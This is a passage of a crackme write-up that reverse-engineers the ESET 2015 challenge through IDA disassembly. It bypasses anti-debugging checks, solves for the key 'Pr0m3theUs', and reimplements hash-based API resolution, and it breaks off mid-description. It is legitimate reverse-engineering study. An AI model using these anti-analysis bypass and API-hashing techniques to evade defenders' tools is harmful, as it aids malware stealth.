&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;EncodeDecode&lt;/span&gt;(ea, size, xor, inc):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(size):
        PatchByte(ea, Byte(ea)^xor)
        xor = xor+inc &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The second anti-debugging check is present at&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401622                 mov     eax, large fs:30h        ; PEB
.text:00401628                 movzx   eax, byte ptr [eax+2]    ; PEB.BeingDebugged
.text:0040162C                 test    eax, eax
.text:0040162E                 jnz     short loc_401632
.text:00401630                 jmp     short loc_40163A
.text:00401632 ; ---------------------------------------------------------------------------
.text:00401632
.text:00401632 loc_401632:                             ; CODE XREF: _main+23E↑j
.text:00401632                 push    0               ; uExitCode
.text:00401634                 call    ds:ExitProcess
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The third anti-debugging check uses &lt;code&gt;GetTickCount&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401475                 call    ds:GetTickCount
.text:0040147B                 mov     [ebp+var_14], eax
;
;   ... flag checking stuff ...
;
.text:0040163A loc_40163A:                             ; CODE XREF: _main+240↑j
.text:0040163A                 call    ds:GetTickCount
.text:00401640                 mov     [ebp+var_10], eax
.text:00401643                 mov     eax, [ebp+var_10]
.text:00401646                 sub     eax, [ebp+var_14]
.text:00401649                 cmp     eax, 64h
.text:0040164C                 jbe     short loc_401656
.text:0040164E                 push    0               ; uExitCode
.text:00401650                 call    ds:ExitProcess
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The flag checking stuff is a series of equations which are validated&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szInput[7]+szInput[6] == 0xcd &amp;amp;&amp;amp;
szInput[8]+szInput[5] == 0xc9 &amp;amp;&amp;amp;
szInput[7]+szInput[6]+szInput[3] == 0x13a &amp;amp;&amp;amp;
szInput[9]+szInput[4]+szInput[8]+szInput[5] == 0x16f &amp;amp;&amp;amp;
szInput[1]+szInput[0] == 0xc2 &amp;amp;&amp;amp;
szInput[0]+...+szInput[9] == 0x39b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From the above equations, we get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;szInput[3] = 0x13a-0xcd
szInput[2] = 0x39b-(0x16f+0x13a+0xc2)
szInput[0] = ?
szInput[1] = 0xc2-szInput[0]
szInput[4] = ?
szInput[9] = 0x16f-0xc9-szInput[4]
szInput[5] = ?
szInput[8] = 0xc9-szInput[5]
szInput[6] = ?
szInput[7] = 0xcd-szInput[6]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If these equations are satisfied, and you bypass the anti-debugging checks, you get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.text:00401656 loc_401656:
.text:00401656                 push    0Ah
.text:00401658                 lea     ecx, [ebp+Buffer]
.text:0040165B                 push    ecx
.text:0040165C                 call    Ror9Hash         ; compute hash
.text:00401661                 cmp     eax, 1928F914h
.text:00401666                 jnz     short loc_4016C9
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Ror9Hash&lt;/strong&gt; does something like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;Ror9Hash&lt;/span&gt;(buf, size):
    ans = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(size):
        ans = ror(ans, &lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;)^buf[i]
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, now do we need to brute 4 bytes for matching the hash? No! Why ??? Analyze a bit more before looking below &amp;hellip;.&lt;/p&gt;
&lt;p&gt;If the hash matches, the following is printed&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.data:00418038 aGoodWorkLittle db &#39;!Good work. Little help:&#39;,0Ah
.data:00418038                                         ; DATA XREF: _main+2DF↑o
.data:00418038                                         ; _main+2EF↑o ...
.data:00418038                 db &#39;char[8] = 85&#39;,0Ah
.data:00418038                 db &#39;char[0] + char[2] = 128&#39;,0Ah
.data:00418038                 db &#39;char[4] - char[7] = -50&#39;,0Ah
.data:00418038                 db &#39;char[6] + char[9] = 219&#39;,0Ah,0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From these equations, we get the key&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# solution.py&lt;/span&gt;
N = &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;
b = [&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(N)]
b[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;85&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 0+2 = 128, 4-7 = -50, 6+9 = 219&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 7+6 = 0xcd&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 8+5 = 0xc9&lt;/span&gt;
b[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;0xc9&lt;/span&gt;-b[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;]
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 7+6+3 = 0x13a&lt;/span&gt;
b[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;0x13a&lt;/span&gt;-&lt;span style=&#34;color:#3677a9&#34;&gt;0xcd&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 9+4+8+5 = 0x16f&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 1+0 = 0xc2&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# sum = 0x39b&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# sum(0..3) = 351&lt;/span&gt;

&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 4+5+6+7+8+9 = 572&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 4+7 = 152&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 4-7 = -50&lt;/span&gt;

b[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;51&lt;/span&gt;
b[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;50&lt;/span&gt;+b[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;]
b[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;0xcd&lt;/span&gt;-b[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;]
b[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;219&lt;/span&gt;-b[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;]
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# 0+1+2 = 242&lt;/span&gt;
b[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;242&lt;/span&gt;-&lt;span style=&#34;color:#3677a9&#34;&gt;0xc2&lt;/span&gt;
b[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;242&lt;/span&gt;-&lt;span style=&#34;color:#3677a9&#34;&gt;128&lt;/span&gt;
b[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;] = &lt;span style=&#34;color:#3677a9&#34;&gt;0xc2&lt;/span&gt; - b[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;.join(&lt;span style=&#34;color:#24909d&#34;&gt;map&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;, b))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which yields - &lt;code&gt;Pr0m3theUs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;But on entering the key, it prints out&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Congratulations! You guessed the right password, but the message you see is wrong.
Try to look for some unreferenced data, that can be decrypted the same way as this text.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, we missed out something :(&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s take a step back and look at the ctors (called by &lt;code&gt;__cinit&lt;/code&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00402AE8                 mov     esi, offset dword_412144
.text:00402AED                 mov     edi, offset dword_412154
.text:00402AF2                 jmp     short loc_402AFF
.text:00402AF4 ; ---------------------------------------------------------------------------
.text:00402AF4
.text:00402AF4 loc_402AF4:                             ; CODE XREF: __cinit+65↓j
.text:00402AF4                 mov     eax, [esi]
.text:00402AF6                 test    eax, eax
.text:00402AF8                 jz      short loc_402AFC
.text:00402AFA                 call    eax
.text:00402AFC
.text:00402AFC loc_402AFC:                             ; CODE XREF: __cinit+5C↑j
.text:00402AFC                 add     esi, 4
.text:00402AFF
.text:00402AFF loc_402AFF:                             ; CODE XREF: __cinit+56↑j
.text:00402AFF                 cmp     esi, edi
.text:00402B01                 jb      short loc_402AF4
;
; .... stuff ...
;
.rdata:00412144 dword_412144    dd 0                    ; DATA XREF: __cinit+4C↑o
.rdata:00412148                 dd offset InitStdIn
.rdata:0041214C                 dd offset InitStdOut
.rdata:00412150                 dd offset sub_411390
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;sub_411390&lt;/strong&gt; searches for the module whose &lt;em&gt;Ror9Hash&lt;/em&gt; matches &lt;strong&gt;19B9AC28h&lt;/strong&gt;. It happens to be kernel32. The routine then searches the export table for the hash - &lt;strong&gt;0D9A63D0Dh&lt;/strong&gt; which resolves to &lt;code&gt;GetModuleFileName&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:0040124B                 mov     ecx, [ebp+var_48]
.text:0040124E                 mov     [ebp+fnGetModuleFileName], ecx
.text:00401251                 push    104h
.text:00401256                 lea     edx, [ebp+szModuleName]
.text:0040125C                 push    edx
.text:0040125D                 push    0
.text:0040125F                 call    [ebp+fnGetModuleFileName]
.text:00401262                 mov     [ebp+var_74], eax
.text:00401265                 push    0               ; char *
.text:00401267                 lea     eax, [ebp+var_478]
.text:0040126D                 push    eax             ; char *
.text:0040126E                 push    0               ; char *
.text:00401270                 push    0               ; char *
.text:00401272                 lea     ecx, [ebp+szModuleName]
.text:00401278                 push    ecx             ; char *
.text:00401279                 call    __splitpath
.text:0040127E                 add     esp, 14h
.text:00401281                 mov     [ebp+var_38], &#39;C&#39;
.text:00401285                 mov     [ebp+var_37], &#39;r&#39;
.text:00401289                 mov     [ebp+var_36], &#39;4&#39;
.text:0040128D                 mov     [ebp+var_35], &#39;c&#39;
.text:00401291                 mov     [ebp+var_34], &#39;k&#39;
.text:00401295                 mov     [ebp+var_33], &#39;M&#39;
.text:00401299                 mov     [ebp+var_32], &#39;3&#39;
.text:0040129D                 mov     [ebp+var_31], 0
.text:004012A1                 lea     edx, [ebp+var_38]
.text:004012A4                 push    edx             ; char *
.text:004012A5                 lea     eax, [ebp+var_478]
.text:004012AB                 push    eax             ; char *
.text:004012AC                 call    _strcmp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now I guess we know what to do. Just rename the file &lt;code&gt;crackme.exe&lt;/code&gt; to &lt;code&gt;Cr4ckM3.exe&lt;/code&gt; and&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;x0r19x91@x0r19x91 /cygdrive/c/Users/x0r19x91/Desktop/ESET
$ ./Cr4ckM3.exe
Please enter valid password : Pr0m3theUs
https://join.eset.com/ae50b61499d27d7da010c718f265a9a1/crackme.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Yeah !! Now we have the actual crackme!&lt;/p&gt;
&lt;h1 id=&#34;task-2&#34;&gt;Task-2&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00402375                 push    104h            ; nSize
.text:0040237A                 lea     eax, [ebp+Filename]
.text:00402380                 push    eax             ; lpFilename
.text:00402381                 push    0               ; hModule
.text:00402383                 call    GetModuleFileNameA
.text:00402389                 lea     eax, [ebp+Filename]
.text:0040238F                 lea     ecx, [eax+1]
.text:00402392
.text:00402392 loc_402392:                             ; CODE XREF: start+55↓j
.text:00402392                 mov     dl, [eax]
.text:00402394                 inc     eax
.text:00402395                 test    dl, dl
.text:00402397                 jnz     short loc_402392
.text:00402399                 sub     eax, ecx
.text:0040239B                 mov     [ebp+eax+var_105], &#39;l&#39;
.text:004023A3                 lea     eax, [ebp+eax+var_106]
.text:004023AA                 mov     word ptr [eax-1], &#39;ld&#39;
.text:004023B0                 lea     eax, [ebp+Filename]
.text:004023B6                 push    eax             ; lpLibFileName
.text:004023B7                 call    LoadLibraryA
.text:004023BD                 mov     eset_dll, eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The entry point is simple, it just loads EsetCrackme2015.dll&lt;/p&gt;
&lt;p&gt;Now in the DllEntryPoint we have&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:10000231                 mov     eax, large fs:30h
.text:10000237                 mov     eax, [eax+0Ch]
.text:1000023A                 mov     eax, [eax+14h]   ; InMemoryOrderModuleList
.text:1000023D                 push    esi
.text:1000023E                 mov     esi, eax
.text:10000240                 test    eax, eax
.text:10000242                 jz      loc_100002E2
.text:10000248                 push    ebx
.text:10000249                 push    edi
.text:1000024A
.text:1000024A loc_1000024A:                           ; CODE XREF: DllEntryPoint+6B↓j
.text:1000024A                 mov     ecx, [eax+28h]   ; BaseDllName
.text:1000024D                 test    ecx, ecx
.text:1000024F                 jz      loc_100002E0
.text:10000255                 cmp     word ptr [ecx], 0
.text:10000259                 mov     edi, 811C9DC5h
.text:1000025E                 jz      short loc_1000028B
.text:10000260
.text:10000260 loc_10000260:                           ; CODE XREF: DllEntryPoint+5B↓j
.text:10000260                 mov     dl, [ecx]
.text:10000262                 add     ecx, 2
.text:10000265                 lea     ebx, [edx-61h]
.text:10000268                 cmp     bl, 19h
.text:1000026B                 ja      short loc_10000270
.text:1000026D                 add     dl, -20h
.text:10000270
.text:10000270 loc_10000270:                           ; CODE XREF: DllEntryPoint+45↑j
.text:10000270                 movsx   edx, dl
.text:10000273                 xor     edx, edi
.text:10000275                 imul    edx, 1000193h
.text:1000027B                 cmp     word ptr [ecx], 0
.text:1000027F                 mov     edi, edx
.text:10000281                 jnz     short loc_10000260
.text:10000283                 cmp     edi, 0FC706866h
.text:10000289                 jz      short loc_10000295
.text:1000028B
.text:1000028B loc_1000028B:                           ; CODE XREF: DllEntryPoint+38↑j
.text:1000028B                 mov     esi, [esi]
.text:1000028D                 mov     eax, [esi]
.text:1000028F                 test    eax, eax
.text:10000291                 jnz     short loc_1000024A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It searches through the list of loaded modules for the hash &lt;strong&gt;0FC706866h&lt;/strong&gt; which happens to be &lt;strong&gt;EsetCrackme2015.exe&lt;/strong&gt;. The hash algorithm used is&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# fnv hash&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;hash16&lt;/span&gt;(name):
    ans = &lt;span style=&#34;color:#3677a9&#34;&gt;0x811c9dc5&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; name:
        ans = (ans^&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(i.upper()))*&lt;span style=&#34;color:#3677a9&#34;&gt;0x1000193&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xffffffff&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:10000295                 mov     eax, [eax+10h]   ; BaseAddress
.text:10000298                 test    eax, eax
.text:1000029A                 jz      short loc_100002E0
.text:1000029C                 mov     ecx, 1000h
.text:100002A1                 mov     edx, 1010101h
.text:100002A6
.text:100002A6 loc_100002A6:                           ; CODE XREF: DllEntryPoint+B0↓j
.text:100002A6                 mov     esi, [ecx+eax]
.text:100002A9                 add     esi, edx
.text:100002AB                 cmp     esi, 0FB131506h
.text:100002B1                 jnz     short loc_100002CF
.text:100002B3                 mov     esi, [ecx+eax+4]
.text:100002B7                 add     esi, edx
.text:100002B9                 cmp     esi, 20C16ADFh
.text:100002BF                 jnz     short loc_100002CF
.text:100002C1                 mov     esi, [ecx+eax+8]
.text:100002C5                 add     esi, edx
.text:100002C7                 cmp     esi, 0C43360A2h
.text:100002CD                 jz      short loc_100002DA
.text:100002CF
.text:100002CF loc_100002CF:                           ; CODE XREF: DllEntryPoint+8B↑j
.text:100002CF                                         ; DllEntryPoint+99↑j
.text:100002CF                 inc     ecx
.text:100002D0                 cmp     ecx, 2F00h
.text:100002D6                 jb      short loc_100002A6
.text:100002D8                 jmp     short loc_100002E0
.text:100002DA ; ---------------------------------------------------------------------------
.text:100002DA
.text:100002DA loc_100002DA:                           ; CODE XREF: DllEntryPoint+A7↑j
.text:100002DA                 lea     eax, [ecx+eax+0Ch]
.text:100002DE                 call    eax
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, it finds the address of the following sequence of bytes in &lt;strong&gt;EsetCrackme2015.exe&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;05 14 12 fa de 69 c0 1f a1 5f 32 c3​&lt;/code&gt;, which happens to be&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401E93 add eax, 0DEFA1214h
.text:00401E98 imul eax, 325FA11Fh
.text:00401E9E retn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, the real entry point is 0x401e93+0xc = &lt;code&gt;0x401e9f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ve renamed the real entry point as &lt;strong&gt;Main&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:00401E9F Main            proc near
.text:00401E9F                 push    edi
.text:00401EA0                 xor     edi, edi
.text:00401EA2                 cmp     zero, edi
.text:00401EA8                 jz      short loc_401ED9
.text:00401EAA                 push    esi
.text:00401EAB                 call    getKernel32
.text:00401EB0                 mov     esi, eax
.text:00401EB2                 push    Sleep           ; Sleep
.text:00401EB7                 call    resolve_export_hash
.text:00401EBC                 push    edi
.text:00401EBD                 push    edi
.text:00401EBE                 push    eax
.text:00401EBF                 push    offset Thread1_Proc
.text:00401EC4                 push    edi
.text:00401EC5                 push    edi
.text:00401EC6                 push    CreateThread    ; CreateThread
.text:00401ECB                 mov     zero, edi
.text:00401ED1                 call    resolve_export_hash
.text:00401ED6                 call    eax
.text:00401ED8                 pop     esi
.text:00401ED9
.text:00401ED9 loc_401ED9:                             ; CODE XREF: Main+9↑j
.text:00401ED9                 pop     edi
.text:00401EDA                 retn
.text:00401EDA Main            endp
;
;   ...
;
.text:0040101C Name            db &#39;EsetCrackme2015&#39;,0  ; DATA XREF: start+9↓o
.text:0040102C eset_dll        dd 0CCCCCCCCh           ; DATA XREF: start+7B↓w
.text:00401030 zero            dd 0ED174512h
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&amp;rsquo;s a small IDAPython script to rename imported hashes&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;hashIt&lt;/span&gt;(name):
    ans = &lt;span style=&#34;color:#3677a9&#34;&gt;0x811c9dc5&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; ch &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; name:
        ans = (ans ^ &lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(ch)) * &lt;span style=&#34;color:#3677a9&#34;&gt;0x1000193&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xffffffff&lt;/span&gt;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans

x = AddEnum(-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Global&amp;#34;&lt;/span&gt;, idaapi.decflag())
names = &lt;span style=&#34;color:#24909d&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;kernel_user32.txt&amp;#34;&lt;/span&gt;).read().split()
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; name &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; names:
    AddConstEx(x, name, hashIt(name), -&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;where &lt;strong&gt;kernel_user32.txt&lt;/strong&gt; contains a list of kernel32+user32 exports&lt;/p&gt;
&lt;p&gt;&lt;code&gt;resolve_export_hash&lt;/code&gt; uses &lt;strong&gt;hash16&lt;/strong&gt; algorithm to find a function, given a hash, from the export table of the module base in &lt;strong&gt;esi&lt;/strong&gt;. &lt;strong&gt;Thread1_Proc&lt;/strong&gt; calls &lt;strong&gt;sub_40213B&lt;/strong&gt; with &lt;strong&gt;eax&lt;/strong&gt; pointing to &lt;strong&gt;EsetCrackme2015.dll&lt;/strong&gt;&amp;rsquo;s base address.&lt;/p&gt;
&lt;p&gt;The routine &lt;strong&gt;sub_40213B&lt;/strong&gt; is interesting. It sets up a data structure at &lt;strong&gt;ebp-0x138&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:right&#34;&gt;Offset&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0&lt;/td&gt;
&lt;td&gt;Base address of EsetCrackme2015.dll&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+4&lt;/td&gt;
&lt;td&gt;EsetCrackme2015_dll.SizeofImage&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+8&lt;/td&gt;
&lt;td&gt;128 words initialized to 0 (Marked Array), Initially Unmarked&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x108&lt;/td&gt;
&lt;td&gt;bStopProcessing (initially 0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x109&lt;/td&gt;
&lt;td&gt;bResourcesLoaded (initially 0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x10b&lt;/td&gt;
&lt;td&gt;dwTagToExtract (initially 1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x10d&lt;/td&gt;
&lt;td&gt;Handle returned by CreateEvent&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x111&lt;/td&gt;
&lt;td&gt;_resolve_export&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x115&lt;/td&gt;
&lt;td&gt;xor_string&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x119&lt;/td&gt;
&lt;td&gt;unpack_pe&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x11d&lt;/td&gt;
&lt;td&gt;unpack_pe_key (“SXJyZW4lMjBpc3QlMjBtZW5zY2hsaWNo”)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:right&#34;&gt;+0x121&lt;/td&gt;
&lt;td&gt;hPipe (&amp;quot;\.\pipe\EsetCrackmePipe&amp;quot;)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:004021E8                 push    101h
.text:004021ED                 mov     [esi+125h], eax
.text:004021F3                 mov     dword ptr [esi+115h], offset xor_string
.text:004021FD                 mov     dword ptr [esi+111h], offset _resolve_export
.text:00402207                 mov     [esi+108h], bl
.text:0040220D                 call    _lookup_tag
.text:00402212                 push    3
.text:00402214                 mov     edi, eax
.text:00402216                 call    _lookup_tag
.text:0040221B                 pop     ecx
.text:0040221C                 pop     ecx
.text:0040221D                 cmp     edi, ebx
.text:0040221F                 jz      loc_4022D5
.text:00402225                 cmp     eax, ebx
.text:00402227                 jz      loc_4022D5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here the binary loads some resources with id&amp;rsquo;s 3 and 0x101. The resources have the following layout&lt;/p&gt;
